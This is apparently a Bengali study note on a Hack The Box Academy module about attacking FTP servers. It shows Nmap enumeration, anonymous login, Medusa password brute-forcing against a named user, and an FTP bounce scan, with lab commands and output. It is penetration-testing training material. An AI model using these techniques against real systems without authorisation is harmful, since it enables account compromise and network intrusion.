# Attacking FTP - [LINK](https://academy.hackthebox.com/app/module/116/section/1165)


## FTP কী?

**File Transfer Protocol (FTP)** হলো এমন একটি নেটওয়ার্ক প্রোটোকল যার মাধ্যমে এক কম্পিউটার থেকে অন্য কম্পিউটারে ফাইল ট্রান্সফার করা যায়। ফাইল ট্রান্সফার ছাড়াও এর মাধ্যমে ডিরেক্টরি এবং ফাইলের অন্যান্য কাজ (যেমন: ডিরেক্টরি পরিবর্তন করা, ফাইলের লিস্ট দেখা এবং ডিরেক্টরি বা ফাইল রিনেম ও ডিলিট করা) করা যায়। ডিফল্টভাবে FTP **TCP পোর্ট 21** ব্যবহার করে কাজ করে।

### সহজভাবে

ধরুন আপনার কম্পিউটারে কিছু ফাইল আছে এবং আপনি সেগুলো অন্য একটি সার্ভারে পাঠাতে চান বা সার্ভার থেকে নামাতে চান। FTP মূলত এই আদান-প্রদানের কাজটি করার জন্য তৈরি করা হয়েছে। অনেক কোম্পানি তাদের সফটওয়্যার বা ওয়েবসাইট ডেভেলপমেন্টের কাজে এটি ব্যবহার করে।

### FTP সার্ভারে অ্যাটাক করার উদ্দেশ্য

FTP সার্ভারে অ্যাটাক করার জন্য আমরা সাধারণত এর **মিসকনফিগারেশন (misconfiguration)** বা অতিরিক্ত পারমিশনের (excessive privileges) সুযোগ নিই, অথবা এর কোনো জানা দুর্বলতা (vulnerability) এক্সপ্লয়েট করি। যখন আমরা FTP সার্ভারের অ্যাক্সেস পেয়ে যাই, তখন আমাদের প্রথম কাজ হলো ডিরেক্টরির ভেতরে কী কী ফাইল বা সংবেদনশীল (sensitive/critical) তথ্য আছে তা খুঁজে বের করা।

## Enumeration (এনুমারেশন বা তথ্য সংগ্রহ)

FTP সার্ভার সম্পর্কে তথ্য সংগ্রহ করার জন্য আমরা **Nmap** টুল ব্যবহার করতে পারি।
Nmap-এর ডিফল্ট স্ক্রিপ্ট (`-sC`) ব্যবহার করলে এটি স্বয়ংক্রিয়ভাবে `ftp-anon` নামের একটি স্ক্রিপ্ট চালায়, যা চেক করে দেখে সার্ভারটিতে কোনো পাসওয়ার্ড ছাড়াই (anonymous login) ঢোকা যায় কি না।
আর `-sV` ফ্ল্যাগটি ব্যবহার করলে সার্ভারের ব্যানার এবং ভার্সন সম্পর্কে তথ্য পাওয়া যায়।

### Nmap Command Example

```bash
00Luffy00@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT
Nmap scan report for 192.168.2.142
Host is up (0.00054s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner
| d--x--x--x   2 root     root         1024 Jan 14  2002 bin
| d--x--x--x   2 root     root         1024 Aug 10  1999 etc
| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]
| d--x--x--x   2 root     root         1024 Jan 14  2002 lib
| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub
|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.

```

**এখানে কী হচ্ছে:**

* `nmap`: নেটওয়ার্ক স্ক্যান করার টুল।


* `-sC`: Nmap-এর ডিফল্ট স্ক্রিপ্টগুলো রান করবে (যেমন `ftp-anon`)।


* `-sV`: সার্ভিসটির ভার্সন বের করবে।


* `-p 21`: শুধুমাত্র পোর্ট 21 (FTP পোর্ট) স্ক্যান করবে।


* আউটপুটে আমরা দেখতে পাচ্ছি `ftp-anon: Anonymous FTP login allowed`, যার মানে হলো সার্ভারটিতে কোনো পাসওয়ার্ড ছাড়াই ঢোকা সম্ভব।

## Misconfigurations (মিসকনফিগারেশন)

FTP সার্ভারে অন্যতম বড় একটি ভুল বা মিসকনফিগারেশন হলো **Anonymous Authentication** বা নাম-পরিচয়হীন লগইন চালু রাখা।
এর মানে হলো, লগইন করার সময় ইউজারনেম হিসেবে `anonymous` লিখলে এবং পাসওয়ার্ডের জায়গা খালি রাখলেও সার্ভারে লগইন করা যায়।

### এটি কেন বিপজ্জনক?

যদি কোম্পানির সার্ভারে ঠিকমতো রিড (read) ও রাইট (write) পারমিশন সেট করা না থাকে, তবে যে কেউ `anonymous` ইউজার হিসেবে ঢুকে কোম্পানির গুরুত্বপূর্ণ তথ্য ডাউনলোড করতে পারে। এমনকি তারা ক্ষতিকর কোনো স্ক্রিপ্টও আপলোড করতে পারে। পরবর্তীতে ওয়েব অ্যাপ্লিকেশনের অন্য কোনো দুর্বলতা (যেমন: path traversal) কাজে লাগিয়ে ওই আপলোড করা ফাইলটি (যেমন: PHP কোড) এক্সিকিউট বা রান করানো সম্ভব হতে পারে।

### Anonymous Authentication Example

```bash
00Luffy00@htb[/htb]$ ftp 192.168.2.142    
                     
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
226 Directory send OK.

```

একবার লগইন করে ফেলার পর আমরা Linux-এর মতো `ls` (লিস্ট দেখা) এবং `cd` (ডিরেক্টরি পরিবর্তন) কমান্ড ব্যবহার করে ভেতরে ঘুরতে পারি।

* **ডাউনলোড করতে:** একটি ফাইলের জন্য `get`, একাধিক ফাইলের জন্য `mget`।


* **আপলোড করতে:** একটি ফাইলের জন্য `put`, একাধিক ফাইলের জন্য `mput`।


* আরও কমান্ড জানতে `help` ব্যবহার করা যায়।

## Protocol Specifics Attacks (প্রোটোকল ভিত্তিক আক্রমণ)

আমরা সরাসরি প্রোটোকলকে আক্রমণ করি না, বরং যে সার্ভিসটি প্রোটোকল ব্যবহার করছে তাকে আক্রমণ করি। চলুন এমন কিছু অ্যাটাক সম্পর্কে জানা যাক।

### Brute Forcing (ব্রুট ফোর্সিং)

যদি সার্ভারে Anonymous লগইন বন্ধ থাকে, তখন আমরা আগে থেকে তৈরি করা ইউজারনেম ও পাসওয়ার্ডের লিস্ট (wordlist) ব্যবহার করে জোরপূর্বক লগইন করার চেষ্টা করতে পারি, যাকে ব্রুট ফোর্সিং বলে।

এর জন্য অনেক টুল আছে, যার মধ্যে একটি হলো **Medusa**।

> **নোট:** বর্তমানে বেশিরভাগ অ্যাপ্লিকেশন ব্রুট ফোর্স অ্যাটাক আটকে দেয়। তাই এর চেয়ে **Password Spraying** (একটি পাসওয়ার্ড অনেকগুলো অ্যাকাউন্টে ট্রাই করা) মেথডটি বেশি কার্যকর।
> 
> 

### Brute Forcing with Medusa

```bash
00Luffy00@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
                                                             
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]

```

**এখানে কমান্ডের অর্থ:**

* `medusa`: ব্রুট ফোর্সিং টুল।


* `-u fiona`: টার্গেট ইউজারনেম নির্দিষ্ট করা হয়েছে (`fiona`)। (ফাইলের মাধ্যমে লিস্ট দিতে `-U` ব্যবহার করা যায়)।


* `-P /usr/.../rockyou.txt`: পাসওয়ার্ডের লিস্ট সম্বলিত ফাইল দেওয়া হয়েছে।


* `-h 10.129.203.7`: টার্গেট হোস্টের আইপি অ্যাড্রেস।


* `-M ftp`: আমরা কোন প্রোটোকলকে টার্গেট করছি তা বলে দেওয়া হয়েছে।

### FTP Bounce Attack

<img width="660" height="329" alt="image" src="https://github.com/user-attachments/assets/c9df5724-daa5-4994-a221-0525e10b1850" />

Source: [https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/](https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/)

এটি এমন একটি নেটওয়ার্ক অ্যাটাক যেখানে অ্যাটাকার একটি FTP সার্ভারকে ব্যবহার করে নেটওয়ার্কের অন্য কোনো ডিভাইসে আউটবাউন্ড ট্রাফিক (outbound traffic) পাঠায়। এখানে অ্যাটাকার `PORT` কমান্ড ব্যবহার করে FTP কানেকশনকে বোকা বানায়, যেন এটি ওই সার্ভারের পরিবর্তে অন্য কোনো ডিভাইস থেকে কমান্ড রান করে বা তথ্য সংগ্রহ করে।

**সহজভাবে বুঝুন:**
ধরুন, ইন্টারনেটে উন্মুক্ত একটি FTP সার্ভার আছে (`FTP_DMZ`)। একই নেটওয়ার্কে আরেকটি ডিভাইস আছে (`Internal_DMZ`), যা ইন্টারনেটে উন্মুক্ত নয়। আমরা `FTP_DMZ` সার্ভারের সাথে কানেক্ট করে **FTP Bounce Attack** ব্যবহার করে ভেতরের `Internal_DMZ` ডিভাইসটি স্ক্যান করতে পারি এবং তার ওপেন পোর্টগুলোর তথ্য বের করতে পারি।

Nmap-এর `-b` ফ্ল্যাগ ব্যবহার করে এই অ্যাটাকটি করা যায়:

```bash
00Luffy00@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>

```

**এখানে কমান্ডের অর্থ:**

* `-Pn`: পিং স্ক্যান বন্ধ করে সরাসরি স্ক্যান করে।


* `-v`: আউটপুটে বিস্তারিত (verbose) তথ্য দেখায়।


* `-n`: DNS রেজোলিউশন বন্ধ রাখে।


* `-p80`: শুধুমাত্র পোর্ট 80 স্ক্যান করবে।


* `-b anonymous:password@10.10.110.213`: এটি FTP বাউন্স প্রক্সি (Proxy) হিসেবে `10.10.110.213` সার্ভারটিকে ব্যবহার করবে।


* `172.17.0.2`: এটি হলো আমাদের মূল টার্গেট (যাকে স্ক্যান করা হচ্ছে)।



> **নোট:** আধুনিক FTP সার্ভারগুলোতে ডিফল্টভাবেই এই ধরনের অ্যাটাক আটকানোর ব্যবস্থা থাকে। তবে যদি সেগুলো ভুলভাবে কনফিগার (misconfigured) করা থাকে, তবেই সার্ভারটি FTP Bounce Attack-এর শিকার হতে পারে।
